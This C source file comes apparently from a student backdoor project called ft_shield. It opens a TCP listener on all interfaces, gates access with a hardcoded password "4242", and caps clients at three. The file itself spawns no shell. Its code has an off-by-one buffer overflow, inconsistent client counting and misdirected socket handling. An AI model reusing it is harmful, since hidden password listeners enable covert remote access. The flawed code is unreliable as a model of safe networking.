#include "server.h"
#include "ft_shield.h"

# define PASSWORD "4242"

int	current_client = 0;

void	init_server(t_server *server)
{
	bzero(server, sizeof(t_server));
	server->port = PORT_FORTYTWO;
	server->sockfd = socket(AF_INET, SOCK_STREAM | SOCK_NONBLOCK, 0);
	if (server->sockfd < 0)
		return ;
	server->addr.sin_family = AF_INET;
	server->addr.sin_addr.s_addr = INADDR_ANY; // 0.0.0.0
	server->addr.sin_port = htons(server->port);
	int	opt = 1;
	if (setsockopt(server->sockfd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt)) < 0)
		return ;
	if (bind(server->sockfd, (struct sockaddr *)&server->addr, sizeof(server->addr)) < 0)
		return ;
	listen(server->sockfd, 1024);
}

void	add_fd_in_epoll(int epoll_fd, int fd, uint32_t opt)
{
	struct epoll_event epoll_ev;

	epoll_ev.events = opt;
	epoll_ev.data.fd = fd;
	if (epoll_ctl(epoll_fd, EPOLL_CTL_ADD, fd, &epoll_ev) == -1)
	{
		close(epoll_fd);
		exit(EXIT_FAILURE);
	}
}

void	check_password(int fd, uint32_t events, t_server *server)
{
	char	buffer[4096];
	int		ret;

	if (events & EPOLLIN)
	{
		ret = read(fd, buffer, sizeof(buffer));
		if (ret <= 0)
			return ;
		buffer[ret] = '\0';
		if (strncmp(buffer, PASSWORD, strlen(PASSWORD)) == 0)
		{
			write(fd, "OK\n", sizeof("OK\n"));
			current_client++;
		}
		else
			write(fd, "KO\n", sizeof("KO\n"));
	}
}

void	server()
{
	t_server	server;
	struct epoll_event events[1024];

	init_server(&server);
	server.epollfd = epoll_create1(EPOLL_CLOEXEC);
	add_fd_in_epoll(server.epollfd, server.sockfd, EPOLLIN);
	while (1)
	{
		int nfds = epoll_wait(server.epollfd, events, 10, -1);
		for (int i = 0; i < nfds; i++)
		{
			if (events[i].events & EPOLLIN)
			{
				if (events[i].data.fd == server.sockfd)
				{
					t_client	client;

					if (current_client < 3)
					{
						client.fd = accept(server.sockfd, NULL, NULL);
						add_fd_in_epoll(server.epollfd, client.fd, EPOLLIN | EPOLLOUT);
						write(client.fd, "password: ", sizeof("password: "));
					}
					else
					{
						write(events[i].data.fd, "try later. Connection max\n", sizeof("try later. Connection max\n"));
						close(events[i].data.fd);
					}
				}
				else
				{
					check_password(events[i].data.fd, events[i].events, &server);
				}
			}
			if (events[i].events & (EPOLLOUT | EPOLLHUP | EPOLLERR | EPOLLRDHUP))
			{
				epoll_ctl(server.epollfd, EPOLL_CTL_DEL, events[i].data.fd, NULL);
				--current_client;
				close(events[i].data.fd);
			}
		}
	}
}